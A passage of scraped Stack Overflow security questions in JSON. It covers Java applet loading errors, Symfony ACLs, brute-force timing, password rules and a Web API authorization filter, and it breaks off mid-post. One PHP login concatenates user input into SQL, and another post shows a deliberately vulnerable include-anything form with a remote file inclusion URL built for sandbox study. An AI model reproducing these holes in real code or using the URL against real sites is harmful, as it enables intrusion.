sun.plugin.PluginURLJarFileCallBack.downloadJAR(Unknown Source)\nat sun.plugin.PluginURLJarFileCallBack.access$000(Unknown Source)\nat sun.plugin.PluginURLJarFileCallBack$1.run(Unknown Source)\nat java.security.AccessController.doPrivileged(Native Method)\nat sun.plugin.PluginURLJarFileCallBack.retrieve(Unknown Source)\nat sun.net.www.protocol.jar.URLJarFile.retrieve(Unknown Source)\nat sun.net.www.protocol.jar.URLJarFile.getJarFile(Unknown Source)\nat sun.net.www.protocol.jar.JarFileFactory.get(Unknown Source)\nat sun.net.www.protocol.jar.JarURLConnection.connect(Unknown Source)\nat sun.plugin.net.protocol.jar.CachedJarURLConnection.connect(Unknown Source)\nat sun.plugin.net.protocol.jar.CachedJarURLConnection.getJarFileInternal(Unknown Source)\nat sun.plugin.net.protocol.jar.CachedJarURLConnection.getJarFile(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath$JarLoader.getJarFile(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath$JarLoader.access$1000(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath$JarLoader$1.run(Unknown Source)\nat java.security.AccessController.doPrivileged(Native Method)\nat com.sun.deploy.security.DeployURLClassPath$JarLoader.ensureOpen(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath$JarLoader.&lt;init&gt;(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath$3.run(Unknown Source)\nat java.security.AccessController.doPrivileged(Native Method)\nat com.sun.deploy.security.DeployURLClassPath.getLoader(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath.getLoader(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath.getResource(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader$2.run(Unknown Source)\nat java.security.AccessController.doPrivileged(Native Method)\nat sun.plugin2.applet.Plugin2ClassLoader.findClassHelper(Unknown Source)\nat sun.plugin2.applet.Applet2ClassLoader.findClass(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\nat java.lang.ClassLoader.loadClass(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadCode(Unknown Source)\nat sun.plugin2.applet.Plugin2Manager.initAppletAdapter(Unknown Source)\nat sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Unknown Source)\nat java.lang.Thread.run(Unknown Source)\nIgnored exception: java.lang.SecurityException: illegal URL redirect\nbasic: Dialog type is not candidate for embedding\nbasic: Removed progress listener: sun.plugin.util.ProgressMonitorAdapter@acf892\nbasic: Loading Java Applet Failed...\nsecurity: Accessing keys and certificate in Mozilla user profile: null\nsecurity: Reset deny session certificate store\n</code></pre>\n\n<p>Edit: Here's the html code I'm using to load the applet.</p>\n\n<pre><code>\n    {applet width=800 height=800 archive='DatRLTest.jar,SharedClasses.jar'    code='vc.voidwhisperer.datrl.main'}\n    {PARAM name=\"java_arguments\" value=\"-Djava.net.preferIPv4Stack=true\"}\n    {/applet}\n</code></pre>\n\n<p>The less than &amp; greater than signs were replaced due to the fact that it didn't like me attempting to put something with them.</p>\n\n<p>Edit #2: I have self-signed the jar, this is still happening. I still have yet to figure out how to solve this..</p>\n\n<p>Final edit: After many hours of working on this, I have finally come across a solution, thanks to a friend in an irc channel. Here's the general gist of how it was fixed:</p>\n\n<ul>\n<li>If you look at a specific line of the output: network: Connecting <a href=\"http://voidchar.com/Other/DatRLTest.jar.pack.gz\" rel=\"nofollow\">http://voidchar.com/Other/DatRLTest.jar.pack.gz</a> with proxy=DIRECT.</li>\n<li>Upon looking for that file it didn't exist. </li>\n<li>Doing some research into the file type, it's a pack200 jar which can be made using a jar and then doing the following with it: opening up cmd, and typing 'pack200 example.jar.pack.gz [JarLocation]'. </li>\n<li>Now, replace example.jar with the name of your jar file but leave the .pack.gz there. </li>\n<li>Now, upload that file to the same directory as the applet and attempt to load the applet up again.</li>\n</ul>\n\n<p><strong>NOTE: Make sure the applet is signed!!</strong> Hope this helps others solve the problem I had.</p>\n"},{"tags":["javascript","security"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":84,"score":2,"question_id":12654663,"title":"Do we really need to hide js (jquery) code?","body":"<p>I realize that we can view the JS code in the browser via <em>Inspect element > source</em> or the like. For example, I have following code and it can be view under \"source\".</p>\n\n<pre><code>$.ajax({\n    url: baseUrl + 'location/insert_user_location',\n    type: \"post\",\n    data: {address:address,lat:lat,lng:lng,acc:acc},\n}).done(function(){\n    getUserLocation();\n});\n</code></pre>\n\n<p>Is this insecure, or does it even matter?</p>\n"},{"tags":["security","roles","visual-studio-lightswitch"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":12640661,"title":"Lightswitch 2012 Deployment security database","body":"<p>I am fairly new to Lightswitch (2012) and am confused on how the membership tables are deployed if using Windows Authentication with roles specified. My confusion lies in the two connection strings, one has a key called _intrinsic and the other has a guid of sorts as the key. \nWhen I deploy my application as a OOB I get a connection issue and the app fails. If I deploy with no security then the app works fine. I am trying to figure out what I am doing wrong within the deployment settings as I have three spots to enter conn string values. Can anyone please help with this and give me a high level as to which connections are used for application data and which ones are used for security?</p>\n\n<p>Thanks.</p>\n"},{"tags":["java","security","permissions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12649945,"title":"java.security.AccessControlException: access denied","body":"<p>I have this java applet built in netbeans 7.2</p>\n\n<p>it works localy, but when i upload it to my page it doesn't work\nand i get </p>\n\n<blockquote>\n  <p>java.security.AccessControlException: access denied\n  (\"java.net.SocketPermission\" \"www.google.com:80\" \"connect,resolve\")</p>\n</blockquote>\n\n<pre><code>import java.applet.Applet;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport netscape.javascript.JSObject;\n\npublic class FurkkiApp extends Applet {\n\n    @Override\n    public void init() {\n        execute_js(\"appReady()\");\n        //getPageContent(\"http://www.google.com/\", \"false\", \"false\", \"false\", \"false\", \"GET\", \"false\", \"false\");\n    }\n\n    public void execute_js(String js)\n    {\n        //System.out.println(js);  \n        JSObject win = JSObject.getWindow(this);\n        win.eval(js);\n    }\n\n    public void getPageContent(String url_param, String cookies_param, String referer_param, String headers_param, String get_cookies_param, String method_param, String post_data_param, String follow_location_param) {\n\n\n            execute_js(\"appLoading()\");\n\n            execute_js(\"appParam('\"+url_param+\"')\");\n\n\n            URL url;\n\n            try {\n\n                url = new URL(url_param); \n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n\n                /* Un peut de headers */\n                conn.setRequestProperty(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\");\n                conn.setRequestProperty(\"Accept-Language\", \"fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3\");\n                conn.setRequestProperty(\"Cache-Control\", \"max-age=0\");\n                conn.setRequestProperty(\"Connection\", \"keep-alive\");\n                conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1\");\n                /* Inser des cookies */\n                if(!\"false\".equals(cookies_param)){\n                    conn.setRequestProperty(\"cookie\", cookies_param);\n                }\n                /* Un lien rfral si ncessaire */\n                if(!\"false\".equals(referer_param)){\n                    conn.setRequestProperty(\"Referer\", referer_param);\n                }\n\n\n                conn.setDoOutput(true);\n\n                /* On suit le redirection du serveur ou pas? */\n                if(\"true\".equals(follow_location_param)) {\n                    conn.setInstanceFollowRedirects(true);\n                }\n                else {\n                    conn.setInstanceFollowRedirects(false);\n                }\n\n                /* GET Method */\n                switch (method_param) {\n                    case \"GET\":\n                        conn.setRequestMethod(\"GET\");\n\n                        break;\n                    case \"POST\":\n                        conn.setRequestMethod(\"POST\");\n                        conn.setDoInput(true);\n                        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\"); \n                        conn.setRequestProperty(\"Content-Length\", \"\" + Integer.toString(post_data_param.getBytes().length));\n                        conn.setUseCaches (false);\n\n                        DataOutputStream wr = new DataOutputStream(conn.getOutputStream());\n                        wr.writeBytes(post_data_param);\n                        wr.flush();\n                        wr.close();\n                        break; \n                }\n\n\n                /* On affiche seulement les headers */\n                if(\"true\".equals(headers_param))\n                {\n                    String headers_content;\n                    headers_content = \"\";\n\n\n                    /* Seulement les cookies */\n                    if(\"true\".equals(get_cookies_param)){\n                        for (int i=0; ; i++) \n                        {\n                            String headerName = conn.getHeaderFieldKey(i);\n                            String headerValue = conn.getHeaderField(i);\n                            if (headerName == null &amp;&amp; headerValue == null){\n                                break; \n                            }\n                            if (headerName != null &amp;&amp; \"Set-Cookie\".equalsIgnoreCase(headerName)){\n                                String[] fields = headerValue.split(\";\");\n                                headers_content = (new StringBuilder(String.valueOf(headers_content)).append(fields[0]).append(\";\").toString());\n                            }\n                        }\n                        headers_content = headers_content.substring(0, headers_content.length()-1);\n\n                    }\n                    else{ /* La totale */\n                        headers_content = conn.getHeaderFields().toString();\n                    }\n\n\n                    execute_js(\"appContent('\"+URLEncoder.encode(headers_content,\"UTF-8\")+\"')\");\n\n                }\n                else /* On affiche le contenu de la page */\n                {\n\n                    InputStreamReader in = new InputStreamReader((InputStream) conn.getContent());\n                    BufferedReader buff = new BufferedReader(in);\n                    String inputLine;\n                    String pageContent;\n                    pageContent = \"\";\n\n                    while ((inputLine = buff.readLine()) != null) {\n                        pageContent = (new StringBuilder(String.valueOf(pageContent)).append(inputLine).toString());\n                    }\n\n\n                    execute_js(\"appContent('\"+URLEncoder.encode(pageContent,\"UTF-8\")+\"')\");\n                }\n                conn.disconnect();\n\n\n                //execute_js(\"appDone()\");\n\n            } catch (MalformedURLException e) {\n            } catch (IOException e) {\n            }\n\n\n\n\n\n    }\n\n}\n</code></pre>\n\n<p>i have enabled Web start\nCodebase : Web Application Deployement\nSigning: Self-signed by a generated key ( Enable Software Protections )</p>\n\n<p>When i compile the file i gt the jar file from dist folder</p>\n\n<p>the HTML code is:</p>\n\n<pre><code>&lt;applet name=\"app\" codebase=\".\" archive=\"Furikku_v1.jar?1348892645\" code=\"FurkkiApp\" width=\"200\" height=\"200\"&gt;&lt;/applet&gt;\n</code></pre>\n\n<p>and then i call the method with javascript</p>\n\n<pre><code>document.app.getPageContent(rq.url,rq.cookies,rq.referer,rq.headers,rq.get_cookies,rq.fmethod,rq.post_data,rq.follow_location)\n</code></pre>\n\n<p><strong>EDIT:</strong> it seems that the issue is related with javascript \ni removed document.app.getPageContent\nand initialized the app, it get the page content</p>\n\n<p>the problem is that i want to send multiple request using document.app.getPageContent method</p>\n"},{"tags":["security"],"answer_count":35,"favorite_count":70,"up_vote_count":78,"down_vote_count":0,"view_count":5679,"score":78,"question_id":325862,"title":"What are the most common security mistakes programmers make?","body":"<p>There are the obvious wtfs that make the headlines such as SQL injection, authentication in JavaScript but are there other more fundamental and common errors programmmers tend to make when writing applications without considering security?</p>\n"},{"tags":["php","security","symfony2","acl"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":130,"score":2,"question_id":12460083,"title":"ACL ROLE_ADMIN does not work","body":"<p>Maybe somebody here can help me.\nI'm adding blog comments and add the rights on it.</p>\n\n<ul>\n<li>The rights for the user who created the blog the rights are OK.</li>\n<li>The rights for not logged user can view de comment so thats OK.</li>\n<li>The Admin can not edit/delete the comment... But whats wrong?</li>\n</ul>\n\n<p>Part of the Controller code:</p>\n\n<pre><code>// Creating the ACL\n$aclProvider = $this-&gt;get('security.acl.provider');\n$objectIdentity = ObjectIdentity::fromDomainObject($blogComment);\n$acl = $aclProvider-&gt;createAcl($objectIdentity);\n\n// Creating full access for the admin\n$roleSecurityIdentity = new RoleSecurityIdentity('ROLE_ADMIN');\n$acl-&gt;insertObjectAce($roleSecurityIdentity, MaskBuilder::MASK_MASTER );\n\n// Creating view rights for the not-logged in users\n$roleSecurityIdentity = new RoleSecurityIdentity('IS_AUTHENTICATED_ANONYMOUSLY');\n$acl-&gt;insertObjectAce($roleSecurityIdentity, MaskBuilder::MASK_VIEW );\n\n// retrieving the security identity of the currently logged-in user\n$securityContext = $this-&gt;get('security.context');\n$user = $securityContext-&gt;getToken()-&gt;getUser();\n$securityIdentity = UserSecurityIdentity::fromAccount($user);\n\n// grant owner access\n$acl-&gt;insertObjectAce($securityIdentity, MaskBuilder::MASK_OWNER);\n$aclProvider-&gt;updateAcl($acl);\n</code></pre>\n\n<p>Symfony profiler Security</p>\n\n<pre><code>Username    Mitchel\nAuthenticated?  yes\nRoles   [ROLE_ADMIN]\n</code></pre>\n\n<p>Database Dump:</p>\n\n<pre><code>-- phpMyAdmin SQL Dump\n-- version 3.5.2.2\n-- http://www.phpmyadmin.net\n--\n-- Machine: localhost\n-- Genereertijd: 17 sep 2012 om 14:19\n-- Serverversie: 5.1.65\n-- PHP-versie: 5.3.16\n\nSET SQL_MODE=\"NO_AUTO_VALUE_ON_ZERO\";\nSET time_zone = \"+00:00\";\n\n\n-- --------------------------------------------------------\n\n--\n-- Tabelstructuur voor tabel `acl_classes`\n--\n\nCREATE TABLE IF NOT EXISTS `acl_classes` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `class_type` varchar(200) NOT NULL,\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `UNIQ_69DD750638A36066` (`class_type`)\n) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;\n\n--\n-- Gegevens worden uitgevoerd voor tabel `acl_classes`\n--\n\nINSERT INTO `acl_classes` (`id`, `class_type`) VALUES\n(1, 'MV\\\\BetaalbaarkozijnBundle\\\\Entity\\\\BlogComment');\n\n-- --------------------------------------------------------\n\n--\n-- Tabelstructuur voor tabel `acl_entries`\n--\n\nCREATE TABLE IF NOT EXISTS `acl_entries` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `class_id` int(10) unsigned NOT NULL,\n  `object_identity_id` int(10) unsigned DEFAULT NULL,\n  `security_identity_id` int(10) unsigned NOT NULL,\n  `field_name` varchar(50) DEFAULT NULL,\n  `ace_order` smallint(5) unsigned NOT NULL,\n  `mask` int(11) NOT NULL,\n  `granting` tinyint(1) NOT NULL,\n  `granting_strategy` varchar(30) NOT NULL,\n  `audit_success` tinyint(1) NOT NULL,\n  `audit_failure` tinyint(1) NOT NULL,\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `UNIQ_46C8B806EA000B103D9AB4A64DEF17BCE4289BF4` (`class_id`,`object_identity_id`,`field_name`,`ace_order`),\n  KEY `IDX_46C8B806EA000B103D9AB4A6DF9183C9` (`class_id`,`object_identity_id`,`security_identity_id`),\n  KEY `IDX_46C8B806EA000B10` (`class_id`),\n  KEY `IDX_46C8B8063D9AB4A6` (`object_identity_id`),\n  KEY `IDX_46C8B806DF9183C9` (`security_identity_id`)\n) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;\n\n--\n-- Gegevens worden uitgevoerd voor tabel `acl_entries`\n--\n\nINSERT INTO `acl_entries` (`id`, `class_id`, `object_identity_id`, `security_identity_id`, `field_name`, `ace_order`, `mask`, `granting`, `granting_strategy`, `audit_success`, `audit_failure`) VALUES\n(1, 1, 1, 1, NULL, 0, 128, 1, 'all', 0, 0),\n(2, 1, 1, 2, NULL, 1, 1, 1, 'all', 0, 0),\n(3, 1, 1, 3, NULL, 2, 64, 1, 'all', 0, 0);\n\n-- --------------------------------------------------------\n\n--\n-- Tabelstructuur voor tabel `acl_object_identities`\n--\n\nCREATE TABLE IF NOT EXISTS `acl_object_identities` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `parent_object_identity_id` int(10) unsigned DEFAULT NULL,\n  `class_id` int(10) unsigned NOT NULL,\n  `object_identifier` varchar(100) NOT NULL,\n  `entries_inheriting` tinyint(1) NOT NULL,\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `UNIQ_9407E5494B12AD6EA000B10` (`object_identifier`,`class_id`),\n  KEY `IDX_9407E54977FA751A` (`parent_object_identity_id`)\n) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;\n\n--\n-- Gegevens worden uitgevoerd voor tabel `acl_object_identities`\n--\n\nINSERT INTO `acl_object_identities` (`id`, `parent_object_identity_id`, `class_id`, `object_identifier`, `entries_inheriting`) VALUES\n(1, NULL, 1, '1', 1);\n\n-- --------------------------------------------------------\n\n--\n-- Tabelstructuur voor tabel `acl_object_identity_ancestors`\n--\n\nCREATE TABLE IF NOT EXISTS `acl_object_identity_ancestors` (\n  `object_identity_id` int(10) unsigned NOT NULL,\n  `ancestor_id` int(10) unsigned NOT NULL,\n  PRIMARY KEY (`object_identity_id`,`ancestor_id`),\n  KEY `IDX_825DE2993D9AB4A6` (`object_identity_id`),\n  KEY `IDX_825DE299C671CEA1` (`ancestor_id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n\n--\n-- Gegevens worden uitgevoerd voor tabel `acl_object_identity_ancestors`\n--\n\nINSERT INTO `acl_object_identity_ancestors` (`object_identity_id`, `ancestor_id`) VALUES\n(1, 1);\n\n-- --------------------------------------------------------\n\n--\n-- Tabelstructuur voor tabel `acl_security_identities`\n--\n\nCREATE TABLE IF NOT EXISTS `acl_security_identities` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `identifier` varchar(200) NOT NULL,\n  `username` tinyint(1) NOT NULL,\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `UNIQ_8835EE78772E836AF85E0677` (`identifier`,`username`)\n) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;\n\n--\n-- Gegevens worden uitgevoerd voor tabel `acl_security_identities`\n--\n\nINSERT INTO `acl_security_identities` (`id`, `identifier`, `username`) VALUES\n(2, 'IS_AUTHENTICATED_ANONYMOUSLY', 0),\n(1, 'MV\\\\BetaalbaarkozijnBundle\\\\Entity\\\\User-User', 1),\n(3, 'ROLE_ADMIN', 0);\n\n--\n-- Beperkingen voor gedumpte tabellen\n--\n\n--\n-- Beperkingen voor tabel `acl_entries`\n--\nALTER TABLE `acl_entries`\n  ADD CONSTRAINT `FK_46C8B8063D9AB4A6` FOREIGN KEY (`object_identity_id`) REFERENCES `acl_object_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,\n  ADD CONSTRAINT `FK_46C8B806DF9183C9` FOREIGN KEY (`security_identity_id`) REFERENCES `acl_security_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,\n  ADD CONSTRAINT `FK_46C8B806EA000B10` FOREIGN KEY (`class_id`) REFERENCES `acl_classes` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;\n\n--\n-- Beperkingen voor tabel `acl_object_identities`\n--\nALTER TABLE `acl_object_identities`\n  ADD CONSTRAINT `FK_9407E54977FA751A` FOREIGN KEY (`parent_object_identity_id`) REFERENCES `acl_object_identities` (`id`);\n\n--\n-- Beperkingen voor tabel `acl_object_identity_ancestors`\n--\nALTER TABLE `acl_object_identity_ancestors`\n  ADD CONSTRAINT `FK_825DE2993D9AB4A6` FOREIGN KEY (`object_identity_id`) REFERENCES `acl_object_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,\n  ADD CONSTRAINT `FK_825DE299C671CEA1` FOREIGN KEY (`ancestor_id`) REFERENCES `acl_object_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;\n</code></pre>\n\n<p>I also created a topic on <a href=\"http://forum.symfony-project.org/viewtopic.php?f=23&amp;t=46874\" rel=\"nofollow\">symfony</a> forum, but it seems that they are not so active as stackoverflow ;)</p>\n\n<p>Symfony version: 2.1.2</p>\n\n<p>Thnx,\nRegards Mitchel</p>\n"},{"tags":["security","brute-force"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":36,"score":-2,"question_id":12631064,"title":"how long would it take to brute force an 8 character string vs. a 32 character string","body":"<p>How long would it take to brute force a 32 character string.</p>\n\n<p>Assuming you have a web page that tells you whether the string is valid, and there is no limit to the number of requests.</p>\n\n<p>I'm using a 32 character string in a password reset link emailed to the user, and I'm wondering what the time difference would be to try all 32 characters vs. trying an 8 character string.</p>\n\n<p>Are we talking minutes, hours, days, months?</p>\n"},{"tags":["asp.net","security","windows-7"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2850,"score":2,"question_id":3160381,"title":"Access to the path denied on Windows 7 (System.UnauthorizedAccessException)","body":"<p>I'm getting this error (see title) while trying to parse an XML file in my ASP.NET MVC application. I'm in the early stages of development and I'm just trying to get this working with Visual Studio 2010's built-in DEV server.</p>\n\n<p>I have tried every combination of the following and still no luck:</p>\n\n<ul>\n<li>Granting FULL access to the NETWORK SERVICE account to my entire solution</li>\n<li>Granting FULL access to the IUSER, IIS_IUSRS accounts to my entire solution</li>\n<li>Adding <strong>trust level=\"Full\"</strong> to my web.config</li>\n<li>Adding <strong>identity impersonate=\"true\"</strong> to my web.config</li>\n<li>Granting FULL access to the NETWORK SERVICE account to my entire C: drive</li>\n<li>Running VS as administrator</li>\n<li>Logging in as administrator</li>\n<li>Disabling Windows 7 User Account Control (UAC)</li>\n<li>Smashing head against wall</li>\n</ul>\n\n<p>I fear it's something to do with Window 7 security but I'm not sure. Anyone else experiencing this?</p>\n\n<p>Please note that I do not have an ASPNET account name on my computer. I don't think Windows 7 and the latest version of ASP.NET use that account any more.</p>\n\n<hr>\n\n<p><em>EDIT: I am able to upload files with my app using Server.MapPath which makes me wonder if this is a code issue. However the error is pretty clear when it says \"access to path MyProject.Web is denied\" and that I should allow the ASP.NET account access to it.</em></p>\n\n<hr>\n\n<p><em>EDIT #2: This was caused by an incorrect path. Nothing to do with Windows 7 or granting access to the ASP.NET accounts</em></p>\n"},{"tags":["security","control","version","system"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12651494,"title":"Need Latest Version Control system Secure and protect code","body":"<p>I am looking for version control system in which code is total secure for me here developer can not  reuse my code is it possible ?</p>\n"},{"tags":["security","language-agnostic","validation","passwords"],"answer_count":10,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":2111,"score":3,"question_id":1524330,"title":"What characters would you make invalid for a password?","body":"<p>A hypothetical situation: you've implemented a password handling system, and it doesn't impose any limitations at all on what characters can be used. You want to set up some rules that are a reasonable compromise between two things -</p>\n\n<ol>\n<li>Allow the user as much freedom as possible.</li>\n<li>Allow for the possibility that you may change how you handle passwords in the future - you don't want to rule out reasonable implementations because your users' existing passwords would become invalid.</li>\n</ol>\n\n<p>What rules would you impose? Are there other factors that might affect you choice?</p>\n"},{"tags":["php","mysql","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12649017,"title":"How can I better secure my database connection","body":"<p>I've been told that this code is old way of connecting and is susceptible to sql injections. How can I make it secure?</p>\n\n<p>This is the code I use to check a database for users and add a new user if they don't have an account. I tried mysqli but I don't think I got it right so I had to go back to this for now until I know how to make it secure.</p>\n\n<pre><code>&lt;?php\n// Connect to the database(host, username, password)\n$con = mysql_connect('localhost','user1','pass1');\nif (!$con)\n{\n    echo \"Failed to make connection.\";\n    exit;\n}\n// Select the database. Enter the name of your database (not the same as the table name)\n$db = mysql_select_db('db1');\nif (!$db)\n{\n    echo \"Failed to select db.\";\n    exit;\n}\n// $_POST['username'] and $_POST['password'] are the param names we sent in our click event in login.js\n$username = $_POST['username'];\n$password = $_POST['password'];\n// Select eveything from the users table where username field == the username we posted and password field == the password we posted\n$sql = \"SELECT * FROM users WHERE username = '\" . $username . \"' AND password = '\" . $password . \"'\";\n$query = mysql_query($sql);\n// If we find a match, create an array of data, json_encode it and echo it out\nif (mysql_num_rows($query) &gt; 0)\n{\n    $row = mysql_fetch_array($query);\n    $response = array(\n        'logged' =&gt; true,\n        'name' =&gt; $row['name'],\n        'email' =&gt; $row['email']\n    );\n    echo json_encode($response);\n}\nelse\n{\n    // Else the username and/or password was invalid! Create an array, json_encode it and echo it out\n    $response = array(\n        'logged' =&gt; false,\n        'message' =&gt; 'Invalid Username and/or Password'\n    );\n    echo json_encode($response);\n}\n?&gt;\n</code></pre>\n"},{"tags":["php","security","exploit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":12646563,"title":"Defending Exploits","body":"<p>I've setup a sandbox and trying to run exploits so I can better understand how to better defend against them.  When I run the following, the process is failing as it should and for the right reason.  But then I'm not sure because I can't find a lot of \"how-to write a proper exploit\".  Here is my code and following is the message on failure.  Any guidance would be great.</p>\n\n<pre><code> //unform.php (unprotected form)\n &lt;html&gt;\n &lt;head&gt;\n &lt;title&gt;Try An Exploit&lt;/title&gt;\n &lt;?php\n if (!empty($_GET)){\n    foreach($_GET as $key=&gt;$value){\n    ${$key} = $value;\n    }\n}\n\n //no sanitizer here.\n echo $key;\n include($value);\n ?&gt;\n &lt;/head&gt;\n &lt;body&gt;\n &lt;h1&gt;This Is Bad&lt;/h1&gt;\n\n &lt;form action=\"#\" method=\"get\"&gt;\n&lt;select name=\"COLOR\"&gt;\n       &lt;option value=\"red\"&gt;red&lt;/option&gt;\n       &lt;option value=\"blue\"&gt;blue&lt;/option&gt;\n    &lt;/select&gt;\n&lt;input type=\"submit\" value=\"Kick Me\" /&gt;\n &lt;/form&gt;\n &lt;/body&gt;\n</code></pre>\n\n<p>Exploit script, simple stuff:</p>\n\n<pre><code> exploit.php\n &lt;?php\n   $somevar = \"This is just a string\";\n   echo $somevar;\n ?&gt;\n</code></pre>\n\n<p>Bad guy would hard code the following in their browser address bar:</p>\n\n<pre><code> http://www.sandbox.com/path/to/unform.php?COLOR=http://www.remoteserv.com/exploit.php\n</code></pre>\n\n<p>Output to browser when trying to load the address:</p>\n\n<pre><code> Warning: include() [function.include]: http:// wrapper is disabled in the server configuration by allow_url_include=0\n</code></pre>\n\n<p>So is that it?  Or are there other technique I should be looking out for?<br>\nThanks</p>\n"},{"tags":["asp.net","asp.net-mvc","security","asp.net-web-api"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":247,"score":2,"question_id":12629530,"title":"How to Customize ASP.NET Web API AuthorizeAttribute for Unusual Requirements","body":"<p>I am inheriting from <strong>System.Web.Http.AuthorizeAttribute</strong> to create a custom authorization/authentication routine to meet some unusual requirements for a web application developed using ASP.NET MVC 4. This adds security to the Web API used for Ajax calls from the web client. The requirements are:</p>\n\n<ol>\n<li>The user must logon each time they perform a transaction to verify\nsomeone else has not walked up to the workstation after someone has\nlogged on and walked away.</li>\n<li>Roles cannot be assigned to the web service methods at program time.\nThey must be assigned at run time so that an administrator can\nconfigure this. This information is stored in the system database.</li>\n</ol>\n\n<p>The web client is a <a href=\"http://en.wikipedia.org/wiki/Single-page_application\" rel=\"nofollow\">single page application (SPA)</a> so the typical forms authentication does not work so well, but I am trying reuse as much of the ASP.NET security framework as I can to meet the requirements.  The customized <strong>AuthorizeAttribute</strong> works great for requirement 2 on determining what roles are associated with a web service method. I accept three parameters, application name, resource name and operation to determine which roles are associated with a method.</p>\n\n<pre><code>public class DoThisController : ApiController\n{\n    [Authorize(Application = \"MyApp\", Resource = \"DoThis\", Operation = \"read\")]\n    public string GetData()\n    {\n        return \"We did this.\";\n    }\n}\n</code></pre>\n\n<p>I override the <strong>OnAuthorization</strong> method to get the roles and authenticate the user. Since the user has to be authenticated for each transaction I reduce the back and forth chatter by performing authentication and authorization in the same step.  I get the users credentials from the web client by using basic authentication which passes the encrypted credentials in the HTTP header. So my <strong>OnAuthorization</strong> method looks like this:</p>\n\n<pre><code>public override void OnAuthorization(HttpActionContext actionContext)\n{\n\n     string username;\n     string password;\n     if (GetUserNameAndPassword(actionContext, out username, out password))\n     {\n         if (Membership.ValidateUser(username, password))\n         {\n             FormsAuthentication.SetAuthCookie(username, false);\n             base.Roles = GetResourceOperationRoles();\n         }\n         else\n         {\n             FormsAuthentication.SignOut();\n             base.Roles = \"\";\n         }\n     }\n     else\n     {\n         FormsAuthentication.SignOut();\n         base.Roles = \"\";\n     }\n     base.OnAuthorization(actionContext);\n }\n</code></pre>\n\n<p><strong>GetUserNameAndPassword</strong> retrieves the credentials from the HTTP header. I then use the <strong>Membership.ValidateUser</strong> to validate the credentials. I have a custom membership provider and role provider plugged in to hit a custom database. If the user is authenticated I then retrieve the roles for the resource and operation. From there I use the base <strong>OnAuthorization</strong> to complete the authorization process.  Here is where it breaks down.</p>\n\n<p>If the user is authenticated I use the standard forms authentication methods to log the user in (FormsAuthentication.SetAuthCookie) and if they fail I log them out (FormsAuthentication.SignOut).  But the problem seems to be that base <strong>OnAuthorization</strong> class does not have access to <strong>Principal</strong> that is updated so that <strong>IsAuthenticated</strong> is set to the correct value. It is always one step behind. And my guess is that it is using some cached value that does not get updated until there is a round trip to the web client.</p>\n\n<p>So all of this leads up to my specific question which is, is there another way to set <strong>IsAuthenticated</strong> to the correct value for the current <strong>Principal</strong> without using cookies? It seems to me that cookies do not really apply in this specific scenario where I have to authenticate every time.  The reason I know <strong>IsAuthenticated</strong> is not set to the correct value is I also override the 